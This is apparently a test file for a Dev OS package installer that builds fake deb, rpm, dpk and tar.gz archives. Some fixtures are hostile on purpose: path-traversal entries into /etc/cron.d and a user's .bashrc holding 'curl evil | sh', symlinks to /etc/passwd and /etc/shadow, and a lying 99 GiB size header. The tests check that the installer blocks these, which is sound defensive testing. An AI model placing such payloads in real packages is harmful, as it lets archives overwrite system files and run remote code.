import {Gtk, Gio, GLib, removeTree} from '@dev-os/core';
import {ROOT} from '@dev-os/config';
import {
    packageKind, isPackageFile, unsafeArchivePath, listTar, archiveLooksInstallable, installableFile, tarGzInstallable, inspectPackage, parseAr, parseDebControl,
    memoryStream, gunzipSource, PACKAGE_MIME_TYPES, LIMITS,
} from '../extensions/org.devos.appstore/package-file.js';
import {parseInstallOutput, parseList, PackageManagerCli, PM_ENV} from '../extensions/org.devos.appstore/package-backend.js';
import {openPackageFile, installAction} from '../extensions/org.devos.files/package-open.js';
import {createFileContextMenu, fileMenuOptions} from '../extensions/org.devos.files/context-menu.js';

Gtk.init(null);
const loop = new GLib.MainLoop(null, false);
function assert(value: unknown, message: string): void {if (!value) throw new Error(message);}
const encoder = new TextEncoder();
const text = (path: string) => new TextDecoder().decode(GLib.file_get_contents(`${ROOT}/${path}`)[1]);

// --- fake archive builders -------------------------------------------------------------------------------
function concat(...parts: Uint8Array[]) {const out = new Uint8Array(parts.reduce((sum, part) => sum + part.length, 0)); let at = 0; for (const part of parts) {out.set(part, at); at += part.length;} return out;}
function tarEntry(name: string, content: Uint8Array | string = '', type = '0', extra: {link?: string; size?: number} = {}) {
    const data = typeof content === 'string' ? encoder.encode(content) : content, header = new Uint8Array(512);
    header.set(encoder.encode(name).subarray(0, 100), 0);
    header.set(encoder.encode('0000644\0'), 100);
    const size = extra.size ?? data.length;
    if (size > 0o77777777777) { header[124] = 0x80; let rest = size; for (let i = 135; i > 124; i--) { header[i] = rest % 256; rest = Math.floor(rest / 256); } } // GNU base-256
    else header.set(encoder.encode(`${size.toString(8).padStart(11, '0')}\0`), 124);
    header[156] = type.charCodeAt(0);
    if (extra.link) header.set(encoder.encode(extra.link), 157);
    header.set(encoder.encode('ustar\0'), 257);
    header.fill(0x20, 148, 156); let sum = 0; for (const byte of header) sum += byte;
    header.set(encoder.encode(`${sum.toString(8).padStart(6, '0')}\0 `), 148);
    const padded = new Uint8Array(Math.ceil(data.length / 512) * 512); padded.set(data);
    return concat(header, padded);
}
const tarEnd = () => new Uint8Array(1024);
const tar = (...entries: Uint8Array[]) => concat(...entries, tarEnd());
function gzip(bytes: Uint8Array): Uint8Array {
    const memory = Gio.MemoryOutputStream.new_resizable(), out = Gio.ConverterOutputStream.new(memory, new Gio.ZlibCompressor({format: Gio.ZlibCompressorFormat.GZIP}));
    out.write_all(bytes, null); out.close(null); return memory.steal_as_bytes().toArray();
}
function arMember(name: string, data: Uint8Array) {
    const header = encoder.encode(`${name.padEnd(16)}${'0'.padEnd(12)}${'0'.padEnd(6)}${'0'.padEnd(6)}${'100644'.padEnd(8)}${String(data.length).padEnd(10)}\`\n`);
    return concat(header, data, data.length % 2 ? encoder.encode('\n') : new Uint8Array(0));
}
function rpmHeader(tags: {tag: number; type: number; count: number; data: Uint8Array}[]) {
    const index: number[] = [], store: number[] = [];
    const entries = new Uint8Array(tags.length * 16), view = new DataView(entries.buffer);
    tags.forEach((item, i) => {view.setUint32(i * 16, item.tag); view.setUint32(i * 16 + 4, item.type); view.setUint32(i * 16 + 8, store.length); view.setUint32(i * 16 + 12, item.count); store.push(...item.data);});
    const head = new Uint8Array(16), headView = new DataView(head.buffer); head.set([0x8e, 0xad, 0xe8, 0x01]); headView.setUint32(8, tags.length); headView.setUint32(12, store.length);
    void index; return concat(head, entries, new Uint8Array(store));
}
const cstr = (value: string) => encoder.encode(`${value}\0`);
const strings = (...values: string[]) => concat(...values.map(cstr));
const int32 = (value: number) => {const out = new Uint8Array(4); new DataView(out.buffer).setUint32(0, value); return out;};
function rpmFile(options: {signed?: boolean; scripts?: boolean; evil?: boolean} = {}) {
    const lead = new Uint8Array(96); lead.set([0xed, 0xab, 0xee, 0xdb]);
    const signature = rpmHeader(options.signed ? [{tag: 268, type: 7, count: 8, data: new Uint8Array(8)}] : []);
    const pad = new Uint8Array((8 - (signature.length % 8)) % 8);
    const metadata = rpmHeader([
        {tag: 1000, type: 6, count: 1, data: cstr('Hello-Tool')}, {tag: 1001, type: 6, count: 1, data: cstr('2.3')}, {tag: 1002, type: 6, count: 1, data: cstr('1')},
        {tag: 1004, type: 9, count: 1, data: cstr('Says hello')}, {tag: 1009, type: 4, count: 1, data: int32(4096)}, {tag: 1022, type: 6, count: 1, data: cstr('aarch64')},
        {tag: 1049, type: 8, count: 3, data: strings('libc.so.6', 'rpmlib(CompressedFileNames)', 'bash')},
        ...(options.scripts ? [{tag: 1024, type: 6, count: 1, data: cstr('echo hi')}] : []),
        {tag: 1116, type: 4, count: 2, data: concat(int32(0), int32(1))}, {tag: 1117, type: 8, count: 2, data: strings(options.evil ? 'passwd' : 'hello', 'hello.desktop')},
        {tag: 1118, type: 8, count: 2, data: strings(options.evil ? '/../etc/' : '/usr/bin/', '/usr/share/applications/')},
    ]);
    return concat(lead, signature, pad, metadata);
}
const debFile = (scripts = true) => concat(encoder.encode('!<arch>\n'), arMember('debian-binary', encoder.encode('2.0\n')),
    arMember('control.tar.gz', gzip(tar(tarEntry('./control', 'Package: hello-tool\nVersion: 2.3-1\nArchitecture: arm64\nInstalled-Size: 12\nDepends: libc6 (>= 2.31), bash\nDescription: Says hello\n Longer text.\n'), ...(scripts ? [tarEntry('./postinst', '#!/bin/sh\necho root script\n')] : [])))),
    arMember('data.tar.gz', gzip(tar(tarEntry('./usr/', '', '5'), tarEntry('./usr/bin/hello', '#!/bin/sh\necho hello\n'), tarEntry('./usr/share/applications/hello.desktop', '[Desktop Entry]\n'), tarEntry('./usr/bin/hello-link', '', '2', {link: 'hello'})))));

const temporary = GLib.dir_make_tmp('devos-package-install-XXXXXX');
function write(name: string, bytes: Uint8Array | string) { const path = `${temporary}/${name}`; GLib.file_set_contents(path, typeof bytes === 'string' ? bytes : bytes); return path; }
const manifest = (extra = '') => `{"name":"hello-app","version":"1.2.0","kind":"app","description":"Greets","bin":{"hello":"bin/hello"}${extra}}`;
const goodDpk = () => gzip(tar(tarEntry('package.json', manifest()), tarEntry('bin/', '', '5'), tarEntry('bin/hello', '#!/bin/sh\necho hi\n')));

function formats() {
    assert(packageKind('/a/b/App.DPK') === 'dpk' && packageKind('x.deb') === 'deb' && packageKind('x.rpm') === 'rpm' && packageKind('/h/x.tar.gz') === 'tar.gz', 'four package types recognised, case-insensitive');
    assert(!packageKind('x.tar') && !packageKind('x.gz') && !packageKind('x.dpkx') && !packageKind('.tar.gz') && !packageKind('x.txt') && !packageKind('x.deb.bak'), 'near-miss names are not packages');
    assert(isPackageFile('a.rpm') && !isPackageFile('a.png'), 'isPackageFile');
    assert(unsafeArchivePath('../x') && unsafeArchivePath('a/../../x') && unsafeArchivePath('/etc/passwd') && unsafeArchivePath('a\\b') && unsafeArchivePath('C:/x') && unsafeArchivePath('a\0b') && !unsafeArchivePath('bin/hello') && !unsafeArchivePath('a..b/c'), 'path traversal rules');
    assert(archiveLooksInstallable([{name: './package.json'}]) && archiveLooksInstallable([{name: 'dev-package.json'}]) && archiveLooksInstallable([{name: 'share/applications/x.desktop'}]), 'manifest or desktop marks installable');
    assert(!archiveLooksInstallable([{name: 'src/package.json'}, {name: 'README'}]) && !archiveLooksInstallable([{name: '../package.json'}]) && !archiveLooksInstallable([{name: 'package.json/', type: '5'}]), 'nested/unsafe/directory manifests are not installable');
}
function mimeRegistration() {
    const xml = text('data/mime/packages/org.devos.package.xml');
    assert(xml.includes('type="application/x-devos-package"') && xml.includes('<glob pattern="*.dpk"'), 'shared-mime-info registers *.dpk');
    const desktop = text('data/applications/dev-os-package-install.desktop');
    const line = (key: string) => desktop.split('\n').find(item => item.startsWith(`${key}=`))?.slice(key.length + 1) ?? '';
    assert(line('Exec') === 'dev-os-shell package-install %F' && line('NoDisplay') === 'true' && line('Type') === 'Application', 'package desktop entry launches the install page');
    const types = line('MimeType').split(';').filter(Boolean);
    assert(PACKAGE_MIME_TYPES.every(type => types.includes(type)) && types.length === PACKAGE_MIME_TYPES.length, 'desktop MimeType matches PACKAGE_MIME_TYPES');
    assert(!types.some(type => /gzip|compressed-tar/.test(type)), 'plain .tar.gz must not be claimed (archives keep their behaviour)');
    const defaults = text('data/applications/mimeapps.list');
    assert(PACKAGE_MIME_TYPES.every(type => defaults.includes(`${type}=dev-os-package-install.desktop`)), 'mimeapps.list makes the install page the default');
    const recipe = text('distro/oe/meta-devos/recipes-devos/shell/devos-shell_0.3.6.bb');
    assert(/inherit pkgconfig mime/.test(recipe) && recipe.includes('data/mime/packages/org.devos.package.xml') && recipe.includes('${datadir}/mime/packages'), 'shell recipe installs the MIME package and runs update-mime-database');
    assert(text('bin/dev-os-shell').length > 0 && text('src/main.ts').includes("'package-install'"), 'dev-os-shell accepts package-install');
}
function tarListing() {
    const listing = listTar(gunzipSource(memoryStream(goodDpk())), {maxEntries: 100, maxOutput: 1 << 20});
    assert(!listing.error && listing.entries.map(entry => entry.name).join() === 'package.json,bin/,bin/hello' && listing.manifest?.name === 'package.json' && JSON.parse(listing.manifest.text).version === '1.2.0', 'tar listing reads entries and manifest');
    const hostile = listTar(gunzipSource(memoryStream(gzip(tar(tarEntry('../../etc/cron.d/x', 'boom'), tarEntry('ok', 'x'), tarEntry('link', '', '2', {link: '/etc/passwd'}))))), {maxEntries: 100, maxOutput: 1 << 20});
    assert(hostile.entries.length === 3 && hostile.entries[0].name === '../../etc/cron.d/x' && hostile.entries[2].link === '/etc/passwd', 'hostile names and link targets are reported, never followed');
    const huge = listTar(gunzipSource(memoryStream(gzip(concat(tarEntry('big.bin', '', '0', {size: 99 * 1024 * 1024 * 1024}))))), {maxEntries: 10, maxOutput: 1 << 20});
    assert(huge.error?.includes('ended inside a file') && huge.totalBytes === 99 * 1024 * 1024 * 1024, 'a lying 99 GiB size header fails fast without allocating');
    const many = listTar(gunzipSource(memoryStream(gzip(tar(...Array.from({length: 50}, (_, i) => tarEntry(`f${i}`, 'x')))))), {maxEntries: 10, maxOutput: 1 << 20});
    assert(many.truncated && many.entries.length === 10, 'entry budget truncates');
    const budget = listTar(gunzipSource(memoryStream(gzip(tar(tarEntry('a', new Uint8Array(100_000)), tarEntry('b', 'x'), tarEntry('c', 'x'))))), {maxEntries: 100, maxOutput: 4096});
    assert(budget.truncated, 'output budget truncates');
    const long = 'd/'.repeat(80) + 'file.txt';
    const gnu = listTar(gunzipSource(memoryStream(gzip(tar(tarEntry('././@LongLink', `${long}\0`, 'L'), tarEntry('truncated-name', 'x'))))), {maxEntries: 10, maxOutput: 1 << 20});
    assert(gnu.entries[0]?.name === long, 'GNU long names are honoured');
    const notGzip = listTar(gunzipSource(memoryStream(encoder.encode('definitely not gzip data'))), {maxEntries: 10, maxOutput: 1 << 20});
    let threw = false; void notGzip; try { listTar(gunzipSource(memoryStream(encoder.encode('not gzip'.repeat(100)))), {maxEntries: 10, maxOutput: 1 << 20}); } catch { threw = true; }
    assert(threw || notGzip.error || notGzip.entries.length === 0, 'non-gzip input never yields entries');
}
function onDisk() {
    const dpk = write('good.dpk', goodDpk()), plain = write('plain.tar.gz', gzip(tar(tarEntry('README', 'hi'), tarEntry('src/main.c', 'int main(){}')))), launcher = write('app.tar.gz', gzip(tar(tarEntry('app/', '', '5'), tarEntry('app/share/app.desktop', '[Desktop Entry]\n'))));
    assert(tarGzInstallable(plain) === 'no' && tarGzInstallable(launcher) === 'yes', 'tar.gz probe: plain archives stay archives, launchers are installable');
    const folder = `${temporary}/folder.dpk`; GLib.mkdir_with_parents(folder, 0o755);
    assert(installableFile(dpk) && installableFile(write('x.deb', 'x')) && installableFile(write('x.rpm', 'x')) && installableFile(launcher) && !installableFile(plain) && !installableFile(write('x.txt', 'x')) && !installableFile(folder, true), 'installableFile: four types on files only');
    assert(!installableFile(write('broken.tar.gz', 'garbage')), 'a corrupt .tar.gz keeps its normal open behaviour');
    const info = inspectPackage(dpk);
    assert(info.kind === 'dpk' && info.id === 'hello-app' && info.version === '1.2.0' && info.commands.join() === 'hello' && info.fileCount === 2 && !info.blockers.length && /Not signed/.test(info.signature), 'dpk inspection');
    const bad = inspectPackage(write('evil.dpk', gzip(tar(tarEntry('package.json', manifest()), tarEntry('../../home/x/.bashrc', 'curl evil | sh'), tarEntry('bin/l', '', '2', {link: '/etc/shadow'})))));
    assert(bad.blockers.some(item => item.includes('Unsafe path')) && bad.blockers.some(item => item.includes('link')), 'traversal and links block a dpk');
    assert(inspectPackage(write('nomani.dpk', gzip(tar(tarEntry('bin/x', 'x'))))).warnings.some(item => item.includes('No package.json')), 'dpk without manifest warns');
    assert(inspectPackage(plain).blockers.some(item => item.includes('does not look like an installable package')), 'plain tar.gz is not installable on the page either');
    assert(inspectPackage(write('notreal.dpk', 'plain text')).blockers.length > 0, 'a text file renamed .dpk is rejected');
    const bomb = inspectPackage(write('bomb.dpk', gzip(tar(tarEntry('package.json', manifest()), tarEntry('data', '', '0', {size: LIMITS.maxBytes + 1})))));
    assert(bomb.blockers.length > 0, 'declared sizes over the limit block installation');
    const deb = inspectPackage(write('hello-tool_2.3-1_arm64.deb', debFile()));
    assert(deb.id === 'hello-tool' && deb.version === '2.3-1' && deb.arch === 'arm64' && deb.dependencies.join('|') === 'libc6 (>= 2.31)|bash' && deb.commands.join() === 'hello' && deb.scripts.join() === 'postinst', 'deb control fields');
    assert(deb.warnings.some(item => item.includes('will NOT be executed')) && deb.warnings.some(item => item.includes('link/special')) && deb.launchers.length === 1 && !deb.blockers.length && deb.fileCount === 2, 'deb warnings: scripts never run, links skipped');
    const rpm = inspectPackage(write('hello-tool-2.3-1.aarch64.rpm', rpmFile({scripts: true, signed: true})));
    assert(rpm.id === 'hello-tool' && rpm.version === '2.3-1' && rpm.arch === 'aarch64' && rpm.fileCount === 2 && rpm.commands.join() === 'hello' && rpm.dependencies.join() === 'libc.so.6,bash' && rpm.scripts.join() === 'postinstall' && /does not verify/.test(rpm.signature) && rpm.totalBytes === 4096, 'rpm header fields, dependencies, scriptlets and signature note');
    assert(inspectPackage(write('evil.rpm', rpmFile({evil: true}))).blockers.some(item => item.includes('Unsafe path')), 'rpm traversal blocks');
    assert(inspectPackage(write('bad.rpm', 'nope')).blockers.length > 0 && inspectPackage(write('bad.deb', 'nope')).blockers.length > 0, 'bad rpm/deb magic rejected');
    const fields = parseDebControl('Package: a\nDescription: one\n two\nDepends: x');
    assert(fields.Package === 'a' && fields.Description === 'one\ntwo' && fields.Depends === 'x', 'debian control continuation lines');
    let threw = false; try {parseAr(encoder.encode('garbage!'), () => new Uint8Array(60), 100);} catch {threw = true;} assert(threw, 'ar parser rejects non-ar input');
}
function routing() {
    const dpk = write('route.dpk', goodDpk()), plain = write('route-plain.tar.gz', gzip(tar(tarEntry('README', 'hi')))), launcher = write('route-app.tar.gz', gzip(tar(tarEntry('package.json', manifest()))));
    const opened: string[] = [], opener = (path: string) => {opened.push(path); return true;};
    assert(openPackageFile(dpk, opener) && openPackageFile(`${temporary}/x.deb`, opener) && openPackageFile(`${temporary}/x.rpm`, opener) && openPackageFile(launcher, opener) && opened.length === 4, 'double-click on dpk/deb/rpm/installable tar.gz opens the install page');
    assert(!openPackageFile(plain, opener) && !openPackageFile(`${temporary}/notes.txt`, opener) && !openPackageFile(dpk) && opened.length === 4, 'other files and plain archives keep their behaviour; missing handler falls through');
    assert(!openPackageFile(dpk, () => false), 'a refused install page falls back to the default application');
    const folder = {path: `${temporary}/folder.dpk`, directory: true};
    assert(!installAction(folder, opener) && !installAction({path: `${temporary}/notes.txt`, directory: false}, opener) && !installAction({path: plain, directory: false}, opener) && !installAction(undefined, opener) && !installAction({path: dpk, directory: false}), 'no Install action for folders, other files, plain archives, background or without a handler');
    const names = (path: string, directory: boolean) => createFileContextMenu(fileMenuOptions(), {contextInstall: installAction({path, directory}, opener), contextOpen: () => {}}, true, false, false)
        .get_children().map(child => child.name);
    for (const path of [dpk, `${temporary}/x.deb`, `${temporary}/x.rpm`, launcher]) assert(names(path, false).includes('files-menu-contextInstall'), `Install item for ${path}`);
    for (const [path, directory] of [[folder.path, true], [`${temporary}/notes.txt`, false], [plain, false]] as const) assert(!names(path, directory).includes('files-menu-contextInstall'), `no Install item for ${path}`);
    const before = opened.length; createFileContextMenu(fileMenuOptions(), {contextInstall: installAction({path: dpk, directory: false}, opener)}, true, false, false).get_children().find(child => child.name === 'files-menu-contextInstall')!.activate();
    assert(opened.length === before + 1 && opened[before] === dpk, 'activating Install opens the install page with the file');
    assert(!createFileContextMenu(fileMenuOptions({contextInstall: false}), {contextInstall: installAction({path: dpk, directory: false}, opener)}, true, false, false).get_children().some(child => child.name === 'files-menu-contextInstall'), 'the Install item can be turned off in Files settings');
}
function parsers() {
    const result = parseInstallOutput(['Preparing installation...', 'Installed hello-app 1.2.0', 'Path: /home/u/.local/share/devos/packages/hello-app/1.2.0', 'Run: dev run hello']);
    assert(result.id === 'hello-app' && result.version === '1.2.0' && result.commands[0] === 'hello' && result.path.endsWith('1.2.0') && !result.extension, 'install output parsed');
    assert(parseInstallOutput(['Installed hello 1.0.0', 'Path: /p', 'Run: hello   (or: dev run hello)']).commands.join() === 'hello', 'DevOsPM 0.6.4 shim output parsed');
    assert(parseInstallOutput(['Installed Dev OS extension org.x.Y 2.0', 'Path: /p']).extension, 'extension install output parsed');
    let message = ''; try {parseInstallOutput(['dev: Duplicate archive path: a']);} catch (error) {message = String(error);} assert(message.includes('Duplicate archive path'), 'error line surfaced');
    const list = parseList(JSON.stringify({packages: {hello: {active: {manifest: {version: '1.0.0', description: 'd', bin: {hello: 'bin/hello'}}, kind: 'app', bytes: 10, files: {a: {}, b: {}}}, previous: {manifest: {version: '0.9.0'}}}}, extensions: {'org.x.Ext': {version: '1.0.0', bytes: 5, files: []}}}));
    assert(list.length === 2 && list[0].previousVersion === '0.9.0' && list[0].files === 2 && list[0].commands[0] === 'hello' && list[1].kind === 'extension', 'list --json parsed');
}
async function backend() {
    const script = write('fake-devospm', `#!/bin/sh
echo "$@" >> "${temporary}/calls.log"
case "$1" in
  list) echo '{"packages":{"hello-app":{"active":{"manifest":{"version":"1.0.0"},"kind":"app","bytes":1,"files":{}},"previous":null}},"extensions":{}}' ;;
  install) case "$*" in *boom*) echo "dev: Archive has too many entries" >&2; exit 1;; esac
           echo "Preparing installation..." >&2; echo "Installed hello-app 1.2.0"; echo "Path: /x"; echo "Run: dev run hello" ;;
  remove) echo "Removed $2" ;;
  rollback) echo "Rolled back $2 to 1.0.0" ;;
esac
`); GLib.spawn_command_line_sync(`chmod +x ${script}`); GLib.setenv(PM_ENV, script, true);
    const cli = new PackageManagerCli(), stages: string[] = [], dpk = write('hello-app-1.2.0.dpk', goodDpk());
    const done = await cli.install(dpk, line => stages.push(line));
    assert(done.id === 'hello-app' && done.commands[0] === 'hello' && stages.includes('Preparing installation...') && !cli.busy, 'install streams progress lines and parses the result');
    const calls = new TextDecoder().decode(GLib.file_get_contents(`${temporary}/calls.log`)[1]);
    assert(calls.includes(`install --replace ${dpk}`), 'already-installed packages are replaced, with an absolute path argument');
    const boom = write('boom.dpk', goodDpk()); let message = ''; try {await cli.install(boom, () => {});} catch (error) {message = String(error);}
    assert(message.includes('too many entries'), 'package-manager errors reach the UI');
    let refused = ''; try {await cli.install(write('x.txt', 'x'), () => {});} catch (error) {refused = String(error);} assert(refused.includes('Not a package file'), 'non-package files are never passed to the package manager');
    assert((await cli.installed())[0].id === 'hello-app' && (await cli.rollback('hello-app')) === '1.0.0', 'list and rollback');
    await cli.remove('hello-app'); assert(new TextDecoder().decode(GLib.file_get_contents(`${temporary}/calls.log`)[1]).includes('remove hello-app'), 'remove');
    GLib.setenv(PM_ENV, `${temporary}/missing`, true); let absent = ''; try {await cli.installed();} catch (error) {absent = String(error);} assert(absent.includes('not installed'), 'missing package manager is explained');
    GLib.unsetenv(PM_ENV);
}
async function main() {
    try {
        formats(); mimeRegistration(); tarListing(); onDisk(); routing(); parsers(); await backend();
        print('PASS: package kinds, MIME registration, safe archive inspection (traversal, links, huge sizes), Files routing and menu, package-manager bridge');
    } finally {removeTree(temporary);}
}
let failure: unknown; void main().catch(error => {failure = error;}).finally(() => loop.quit()); loop.run(); if (failure) throw failure;
